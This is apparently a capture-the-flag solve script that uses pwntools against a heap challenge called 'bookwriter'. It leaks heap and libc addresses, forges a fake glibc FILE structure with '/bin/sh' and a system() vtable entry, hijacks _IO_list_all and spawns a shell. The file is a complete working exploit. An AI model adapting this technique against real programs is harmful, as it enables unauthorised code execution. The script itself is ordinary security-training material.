#! /usr/bin/python
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context(arch='amd64', os='linux')  # , log_level='debug')

p = process('./bookwriter')


def login():
    p.sendlineafter('Author :', 'Mech0n\n')


def add(size, payload):
    p.sendlineafter('Your choice :', '1')
    p.sendlineafter('Size of page', str(size))
    p.sendafter('Content :', payload)


def show(idx):
    p.sendlineafter('Your choice :', '2')
    p.sendlineafter('Index of page :', str(idx))


def edit(idx, payload):
    p.sendlineafter('Your choice :', '3')
    p.sendlineafter('Index of page :', str(idx))
    p.sendafter('Content:', payload)


def info(yn):
    p.sendlineafter('Your choice :', '4')
    p.sendlineafter('(yes:1 / no:0)', str(yn))
    if yn == 1:
        login()


def pack_file_64(_flags=0,
                 _IO_read_ptr=0,
                 _IO_read_end=0,
                 _IO_read_base=0,
                 _IO_write_base=0,
                 _IO_write_ptr=0,
                 _IO_write_end=0,
                 _IO_buf_base=0,
                 _IO_buf_end=0,
                 _IO_save_base=0,
                 _IO_backup_base=0,
                 _IO_save_end=0,
                 _IO_marker=0,
                 _IO_chain=0,
                 _fileno=0,
                 _lock=0,
                 _mode=0):
    struct = _flags + \
        p64(_IO_read_ptr) + \
        p64(_IO_read_end) + \
        p64(_IO_read_base) + \
        p64(_IO_write_base) + \
        p64(_IO_write_ptr) + \
        p64(_IO_write_end) + \
        p64(_IO_buf_base) + \
        p64(_IO_buf_end) + \
        p64(_IO_save_base) + \
        p64(_IO_backup_base) + \
        p64(_IO_save_end) + \
        p64(_IO_marker) + \
        p64(_IO_chain) + \
        p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0, "\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct


if __name__ == "__main__":
    login()
    add(0x400 - 0x8, 'mech0n')
    payload = 'a' * (0x400 - 0x8)
    edit(0, payload)
    payload = 'a' * (0x400 - 0x8) + '\x01\x0c\x00'
    edit(0, payload)
    add(0x1000, 'Mech0n\n')
    add(0x20, 'a' * 0x11)
    show(2)
    p.recvuntil('a' * 0x11)
    heap = u64(('\x00' + p.recvuntil('\n')[:-1]).ljust(8, '\x00')) - 0x400

    add(0x20, 'a' * 0x8)
    show(3)
    p.recvuntil('a' * 0x8)
    libc = u64(p.recv(6).ljust(8, '\x00')) - 0x3c4b78

    _IO_file_jumps = libc + 0x3c36e0
    system = libc + 0x045390
    bins = libc + 0x3c4b78
    _IO_list_all = libc + 0x3c5520

    edit(0, '\x00')
    for i in range(5):
        add(0x20, 'Mech0n\n')

    # 0x540
    vtable_addr = 0x640 + heap
    payload = '\x00' * 0x540
    fake_file = pack_file_64(
      _flags='/bin/sh\x00',
      _IO_read_ptr= 0x61,
      _IO_read_end= bins,
      _IO_read_base= _IO_list_all - 0x10,
      _mode=0,
      _IO_write_base=2,
      _IO_write_ptr=3
      )
    payload += fake_file
    payload += p64(vtable_addr)
    payload += p64(1)
    payload += p64(2)
    payload += p64(0)*3   # vtable
    payload += p64(system)

    edit(0, payload)

    success('LIBC: ' + str(hex(libc)))
    success('HEAP: ' + str(hex(heap)))

    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of page :')
    p.sendline(str(0x10))
    # gdb.attach(p)
    p.interactive()
